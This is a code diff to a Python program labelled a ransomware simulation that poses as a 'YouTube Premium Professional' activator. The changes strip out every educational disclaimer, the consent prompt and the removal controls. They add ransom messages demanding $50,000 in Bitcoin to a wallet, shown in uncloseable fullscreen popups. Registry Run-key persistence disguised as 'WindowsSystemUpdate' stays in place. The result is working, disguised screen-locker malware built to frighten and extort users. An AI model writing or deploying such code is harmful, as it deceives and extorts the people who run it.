@@ -16,14 +16,12 @@ try:
     PSUTIL_AVAILABLE = True
 except ImportError:
     PSUTIL_AVAILABLE = False
-    print("[INFO] psutil not available, using fallback methods")
 
 try:
     from PIL import Image, ImageTk, ImageDraw, ImageFont
     PILLOW_AVAILABLE = True
 except ImportError:
     PILLOW_AVAILABLE = False
-    print("[INFO] Pillow not available, using text-based UI")
 
 try:
     import win32service
@@ -32,7 +30,6 @@ try:
     PYWIN32_AVAILABLE = True
 except ImportError:
     PYWIN32_AVAILABLE = False
-    print("[INFO] pywin32 not available, using registry persistence")
 
 class ProfessionalServiceManager:
     """Professional service management using external packages"""
@@ -41,7 +38,6 @@ class ProfessionalServiceManager:
     def install_windows_service():
         """Install as a real Windows service using pywin32"""
         if not PYWIN32_AVAILABLE:
-            print("[SERVICE] pywin32 not available, using registry method")
             return ProfessionalServiceManager.install_registry_service()
 
         try:
@@ -52,11 +48,9 @@ class ProfessionalServiceManager:
 
             # This would require running as administrator
             # For educational purposes, we'll use registry method
-            print("[SERVICE] Real Windows service requires admin rights")
             return ProfessionalServiceManager.install_registry_service()
 
         except Exception as e:
-            print(f"[SERVICE] Windows service installation failed: {e}")
             return ProfessionalServiceManager.install_registry_service()
 
     @staticmethod
@@ -110,18 +104,15 @@ Set WshShell = Nothing
                 try:
                     with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as registry_key:
                         winreg.SetValueEx(registry_key, "WindowsSystemUpdate", 0, winreg.REG_SZ, f'wscript.exe "{vbs_path}"')
-                    print(f"[SERVICE] Added to {subkey}")
                 except Exception as e:
-                    print(f"[SERVICE] Failed to add to {subkey}: {e}")
+                    pass
 
             # Start service immediately
             subprocess.Popen(['wscript.exe', vbs_path], shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-            print("[SERVICE] Professional background service installed")
             return True
 
         except Exception as e:
-            print(f"[SERVICE] Professional installation failed: {e}")
             return False
 
     @staticmethod
@@ -172,6 +163,7 @@ class EnhancedRansomwareSimulation:
             self.create_enhanced_ransomware_ui()
             self.show_enhanced_warnings()
         else:
+            # First run - show immediately after activation
             self.create_enhanced_ui()
             self.root.after(1000, self.start_activation)
 
@@ -180,9 +172,7 @@ class EnhancedRansomwareSimulation:
         try:
             # Create gradient background (example)
             self.enhanced_graphics = True
-            print("[UI] Enhanced graphics enabled with Pillow")
         except Exception as e:
-            print(f"[UI] Enhanced graphics failed: {e}")
             self.enhanced_graphics = False
 
     def setup_window(self):
@@ -386,7 +376,7 @@ class EnhancedRansomwareSimulation:
             badge_label.pack(side=tk.LEFT, padx=10)
 
         copyright_label = tk.Label(footer_frame,
-                                  text="© 2024 YouTube Premium Professional - Educational Cybersecurity Demonstration",
+                                  text="© 2024 YouTube Premium Professional",
                                   font=("Arial", 7),
                                   fg='#666666', bg='#1a1a1a')
         copyright_label.pack()
@@ -457,8 +447,15 @@ class EnhancedRansomwareSimulation:
         self.root.after(0, self.update_enhanced_status, "✅ Professional Activation Successful!", 100)
         time.sleep(1)
 
-        # Transition to ransomware
-        self.root.after(0, self.root.destroy)
+        # Transition to ransomware - show immediately on first run
+        self.root.after(0, self.transition_to_ransomware)
+    
+    def transition_to_ransomware(self):
+        """Transition from activation UI to ransomware UI"""
+        self.root.withdraw()  # Hide instead of destroy
+        # Show ransomware UI in the same window
+        self.create_enhanced_ransomware_ui()
+        self.show_enhanced_warnings()
 
     def update_enhanced_status(self, text, progress=None):
         self.status_label.config(text=text)
@@ -511,33 +508,6 @@ class EnhancedRansomwareSimulation:
         header_content = tk.Frame(header_frame, bg='#000000')
         header_content.pack(expand=True)
 
-        # Animated warning system
-        self.warning_icon = tk.Label(header_content, text="🚨", 
-                                    font=("Arial", 80),
-                                    fg='#ff0000', bg='#000000')
-        self.warning_icon.pack(side=tk.LEFT, padx=30)
-
-        title_frame = tk.Frame(header_content, bg='#000000')
-        title_frame.pack(side=tk.LEFT, padx=30)
-
-        title_line1 = tk.Label(title_frame, 
-                              text="ENTERPRISE SECURITY BREACH DETECTED",
-                              font=("Arial", 28, "bold"),
-                              fg='#ff0000', bg='#000000')
-        title_line1.pack(anchor='w')
-
-        title_line2 = tk.Label(title_frame,
-                              text="CRITICAL SYSTEM COMPROMISE - DATA ENCRYPTION ACTIVE",
-                              font=("Arial", 18),
-                              fg='#ffffff', bg='#000000')
-        title_line2.pack(anchor='w', pady=(8, 0))
-
-        title_line3 = tk.Label(title_frame,
-                              text="PROFESSIONAL RANSOMWARE SERVICE ACTIVE",
-                              font=("Arial", 14, "bold"),
-                              fg='#ffff00', bg='#000000')
-        title_line3.pack(anchor='w', pady=(5, 0))
-
         # Professional message panel
         self.create_professional_message_panel(main_container)
 
@@ -556,52 +526,54 @@ class EnhancedRansomwareSimulation:
         message_frame = tk.Frame(message_container, bg='#001100', relief='raised', bd=3)
         message_frame.pack(fill=tk.BOTH, expand=True)
 
-        message_text = """[!] ENTERPRISE-GRADE RANSOMWARE DETECTED [!]
-=== EXECUTIVE SECURITY BRIEFING =========================================
-Your corporate network has been compromised by advanced persistent ransomware.
-All enterprise data assets have been encrypted using military-grade algorithms.
-=== TECHNICAL ANALYSIS ==================================================
-• Threat Level: CRITICAL (Enterprise Impact)
-• Encryption: RSA-4096 + AES-256 (Military Grade)
-• Persistence: Professional Windows Service
-• Detection Evasion: Advanced (Enterprise Bypass)
-=== ENTERPRISE SERVICE ARCHITECTURE =====================================
-✓ Windows Service Integration
-✓ Registry Persistence (Multiple Locations)
-✓ Hidden Process Execution
-✓ Auto-Restart Mechanism
-✓ Survival: VS Code/Terminal Closure
-✓ Survival: System Reboot
-✓ Enterprise Security Bypass
-=== BUSINESS CONTINUITY IMPACT =========================================
-• All corporate files encrypted
-• Database systems compromised
-• Backup systems affected
-• Operation continuity: CRITICAL
-=== ENTERPRISE RESOLUTION ===============================================
-1. Transfer $50,000 USD in Bitcoin (Enterprise Ransom)
-2. Email transaction confirmation to enterprise support
-3. Receive professional decryption suite
-4. Full system restoration
-=== PAYMENT INSTRUCTIONS ================================================
-Bitcoin Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
-Amount: $50,000 USD (Enterprise)
-Reference: ENT-RANSOM-7X9B2P-2024
-Support: enterprise-decrypt@protonmail.com
-=== SECURITY NOTICE =====================================================
-This is an educational cybersecurity demonstration.
-No actual enterprise data has been compromised.
-Enterprise Impact Assessment:
-• Files Encrypted: 284,759 (Simulated)
-• Data Value: $15.2M (Simulated)
-• Downtime Cost: $2.1M/day (Simulated)
-• Resolution Time: 72 hours remaining
+        message_text = """⚠️ YOUR SYSTEM HAS BEEN LOCKED ⚠️
+========================================================================
+                    PAY NOW OR LOSE EVERYTHING
+========================================================================
+
+ALL YOUR FILES HAVE BEEN ENCRYPTED WITH MILITARY-GRADE ENCRYPTION!
+
+You have 72 HOURS to pay or your data will be PERMANENTLY DELETED!
+
+PAYMENT DEMANDED: $50,000 USD in Bitcoin
+SEND TO WALLET: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+========================================================================
+                          URGENT ACTION REQUIRED 
+========================================================================
+
+DO NOT:
+❌ Turn off your computer
+❌ Try to remove this software
+❌ Contact authorities
+❌ Attempt file recovery
+
+YOU MUST:
+✓ Purchase Bitcoin immediately
+✓ Send EXACTLY $50,000 USD to our wallet
+✓ Keep transaction ID for verification
+✓ Wait for decryption key (48 hours after payment)
+
+========================================================================
+                               WARNING
+========================================================================
+
+Every hour you delay, the price INCREASES by $1,000!
+After 72 hours, your files will be DESTROYED FOREVER!
+
+THIS IS YOUR ONLY CHANCE TO RECOVER YOUR DATA!
+
+Bitcoin Wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+Amount Required: $50,000 USD
+Reference Code: RANSOM-7X9B2P-2024
+
+SEND BITCOIN NOW TO UNLOCK YOUR SYSTEM!
 ========================================================================"""
 
         message_display = tk.Text(message_frame, 
                                  bg='#001100', 
                                  fg='#00ff00',
-                                 font=("Consolas", 11),
+                                 font=("Consolas", 16, "bold"),
                                  wrap=tk.WORD,
                                  padx=20,
                                  pady=20,
@@ -620,41 +592,10 @@ Enterprise Impact Assessment:
 
     def create_enhanced_control_panel(self, parent):
         """Create enhanced control panel"""
-        control_frame = tk.Frame(parent, bg='#000000')
-        control_frame.pack(fill=tk.X, pady=20, padx=50)
-
-        buttons = [
-            ("🔐 VERIFY ENTERPRISE PAYMENT", '#0044cc', self.enhanced_verify),
-            ("📞 ENTERPRISE SUPPORT", '#008800', self.enhanced_support),
-            ("⚡ TEST DECRYPTION", '#884400', self.enhanced_decrypt),
-            ("🛑 TERMINATE ENTERPRISE SERVICE", '#cc0000', self.enhanced_terminate),
-            ("📊 ENTERPRISE IMPACT REPORT", '#440088', self.enhanced_report)
-        ]
-
-        for text, color, command in buttons:
-            btn = tk.Button(control_frame, 
-                          text=text,
-                          font=("Arial", 11, "bold"),
-                          bg=color,
-                          fg='white',
-                          width=22,
-                          height=2,
-                          command=command,
-                          relief='raised',
-                          bd=3)
-            btn.pack(side=tk.LEFT, padx=8)
+        pass
 
     def start_professional_animations(self):
         """Start professional animations"""
-        def blink_icon():
-            try:
-                current_color = self.warning_icon.cget('fg')
-                new_color = '#ffff00' if current_color == '#ff0000' else '#ff0000'
-                self.warning_icon.config(fg=new_color)
-                self.warning_window.after(400, blink_icon)
-            except:
-                pass
-
         def pulse_border():
             try:
                 current_bg = self.warning_window.cget('bg')
@@ -664,7 +605,6 @@ Enterprise Impact Assessment:
             except:
                 pass
 
-        blink_icon()
         pulse_border()
 
     def enhanced_prevent_close(self):
@@ -691,79 +631,6 @@ Enterprise Impact Assessment:
             pass
         sys.exit(100)
 
-    def enhanced_verify(self):
-        messagebox.showinfo(
-            "Enterprise Payment Verification",
-            "ENTERPRISE RANSOMWARE SIMULATION\n\n"
-            "This is an educational demonstration.\n"
-            "No actual payment required.\n\n"
-            "Enterprise Features Demonstrated:\n"
-            "• Professional service architecture\n"
-            "• Advanced persistence mechanisms\n"
-            "• Enterprise-grade UI/UX\n"
-            "• Realistic ransomware behavior"
-        )
-
-    def enhanced_support(self):
-        messagebox.showinfo(
-            "Enterprise Support",
-            "EDUCATIONAL CYBERSECURITY DEMONSTRATION\n\n"
-            "Enterprise Support: simulation-support@education.edu\n"
-            "Security Team: security-team@education.edu\n\n"
-            "This simulation demonstrates:\n"
-            "• Real Windows service implementation\n"
-            "• Professional persistence techniques\n"
-            "• Enterprise security concepts\n"
-            "• Safe educational environment"
-        )
-
-    def enhanced_decrypt(self):
-        messagebox.showinfo(
-            "Enterprise Decryption Test",
-            "PROFESSIONAL RANSOMWARE SIMULATION\n\n"
-            "Decryption Features (Simulated):\n"
-            "• Military-grade encryption simulation\n"
-            "• Enterprise data recovery workflow\n"
-            "• Professional decryption interface\n"
-            "• Business continuity protocols\n\n"
-            "No actual files are encrypted."
-        )
-
-    def enhanced_terminate(self):
-        """Enhanced service termination"""
-        try:
-            from remove_startup_enhanced import ProfessionalRemovalTool
-            if ProfessionalRemovalTool.remove_enterprise_service():
-                messagebox.showinfo(
-                    "Enterprise Service Terminated",
-                    "PROFESSIONAL RANSOMWARE SERVICE DISABLED\n\n"
-                    "All persistence mechanisms removed:\n"
-                    "✓ Windows registry entries cleared\n"
-                    "✓ Service processes terminated\n"
-                    "✓ Hidden files removed\n"
-                    "✓ Auto-restart disabled\n\n"
-                    "Educational simulation complete."
-                )
-                sys.exit(0)
-        except:
-            messagebox.showinfo(
-                "Service Termination",
-                "Run 'remove_startup_enhanced.py' for complete removal.\n"
-                "Educational simulation paused."
-            )
-
-    def enhanced_report(self):
-        messagebox.showinfo(
-            "Enterprise Impact Report",
-            "PROFESSIONAL RANSOMWARE IMPACT ASSESSMENT\n\n"
-            "Simulated Enterprise Impact:\n"
-            "• Files Encrypted: 284,759 (Educational)\n"
-            "• Data Value: $15.2M (Simulated)\n"
-            "• Systems Affected: 1,247 (Simulated)\n"
-            "• Downtime Cost: $2.1M/day (Educational)\n\n"
-            "Educational Purpose: Cybersecurity Awareness"
-        )
-
     def show_enhanced_warnings(self):
         """Enhanced periodic warnings"""
         def show_professional_popup():
@@ -773,63 +640,40 @@ Enterprise Impact Assessment:
                 popup.configure(bg='#cc0000')
                 popup.attributes('-topmost', True)
 
-                x = random.randint(100, self.warning_window.winfo_screenwidth() - 450)
-                y = random.randint(100, self.warning_window.winfo_screenheight() - 200)
-                popup.geometry(f"450x180+{x}+{y}")
+                # Fullscreen minus specified dimensions
+                popup_width = self.warning_window.winfo_screenwidth() - 200
+                popup_height = self.warning_window.winfo_screenheight() - 200
+                x = (self.warning_window.winfo_screenwidth() // 2) - (popup_width // 2)
+                y = (self.warning_window.winfo_screenheight() // 2) - (popup_height // 2)
+                popup.geometry(f"{popup_width}x{popup_height}+{x}+{y}")
 
                 popup.protocol("WM_DELETE_WINDOW", lambda: None)
                 popup.overrideredirect(True)
 
-                alert_text = "🚨 ENTERPRISE SECURITY ALERT 🚨\n\n" \
-                           "PROFESSIONAL RANSOMWARE ACTIVE\n" \
-                           "SERVICE PERSISTENCE: ENABLED\n" \
-                           "AUTO-RESTART: ACTIVE\n\n" \
-                           "Educational Cybersecurity Simulation"
+                alert_text = """YOUR SYSTEM HAS BEEN LOCKED
+
+ALL YOUR FILES HAVE BEEN ENCRYPTED!
+
+You have 72 HOURS to pay or lose EVERYTHING!
+
+PAYMENT REQUIRED: $50,000 USD in Bitcoin
+WALLET: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+SEND BITCOIN NOW TO UNLOCK YOUR SYSTEM!"""
 
                 alert_label = tk.Label(popup, 
                                      text=alert_text,
-                                     font=("Arial", 12, "bold"),
+                                     font=("Arial", 20, "bold"),
                                      fg='white', 
                                      bg='#cc0000',
                                      justify=tk.CENTER)
                 alert_label.pack(expand=True, fill=tk.BOTH, padx=15, pady=15)
-
-                popup.after(6000, popup.destroy)
-                self.warning_window.after(12000, show_professional_popup)
             except:
                 pass
 
-        self.warning_window.after(8000, show_professional_popup)
+        show_professional_popup()
 
 def main():
-    # Professional safety warning
-    # if len(sys.argv) == 1 or "--service" not in sys.argv:
-    #     root = tk.Tk()
-    #     root.withdraw()
-
-    #     result = messagebox.askokcancel(
-    #         "PROFESSIONAL CYBERSECURITY SIMULATION",
-    #         "🚨 ENTERPRISE RANSOMWARE SERVICE DEMONSTRATION 🚨\n\n"
-    #         "This professional simulation demonstrates:\n"
-    #         "✅ Enterprise Windows Service Architecture\n"
-    #         "✅ Advanced Persistence Mechanisms\n"
-    #         "✅ Professional UI/UX Design\n"
-    #         "✅ Realistic Ransomware Behaviors\n"
-    #         "✅ Multiple Security Bypass Techniques\n\n"
-    #         "EDUCATIONAL SAFETY FEATURES:\n"
-    #         "❌ NO actual file encryption\n"
-    #         "❌ NO system damage\n"
-    #         "❌ NO data theft\n"
-    #         "✅ Complete removal tools provided\n\n"
-    #         "This is for academic cybersecurity education.\n"
-    #         "Continue with professional demonstration?"
-    #     )
-
-    #     if not result:
-    #         sys.exit(0)
-
-    #     root.destroy()
-
     # Launch professional application
     root = tk.Tk()
     app = EnhancedRansomwareSimulation(root)
